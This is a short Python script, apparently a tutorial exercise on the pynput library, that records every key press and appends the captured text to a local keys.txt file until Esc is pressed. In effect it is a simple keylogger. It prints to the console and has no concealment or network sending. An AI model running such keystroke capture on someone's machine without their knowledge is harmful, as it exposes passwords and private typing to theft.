# Concepts: pynput library, file interaction

from pynput.keyboard import Key, Controller, Listener
import time

keyboard = Controller()
keys = []

def on_press(key):
    global keys
    string = str(key).replace("'","")
    keys.append(string)

    main_str = ''.join(keys)
    print(main_str)

    if len(main_str)>15:
        with open('keys.txt','a') as f:
            f.write(main_str)
            keys = []


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()